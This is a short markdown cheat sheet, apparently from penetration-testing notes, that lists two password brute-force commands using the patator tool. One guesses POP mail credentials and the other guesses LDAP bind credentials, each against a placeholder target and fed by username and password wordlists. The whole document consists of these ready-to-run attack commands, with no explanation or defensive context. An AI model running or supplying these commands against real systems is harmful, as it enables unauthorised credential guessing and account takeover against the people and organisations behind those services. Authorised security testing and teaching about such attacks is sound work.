# Brute-force

## POP

```bash
python patator.py pop_passd host=<ip> user=FILE0 password=FILE1 0=usernames.txt  1=top-1000.txt -x ignore:code=500
```

---

## LDAP

```bash
python patator.py ldap_login host=<target> binddn='CN=FILE0,dc=<domain>,dc=<fqdn>' bindpw=FILE1 0=users.txt 1=passwords.txt
```

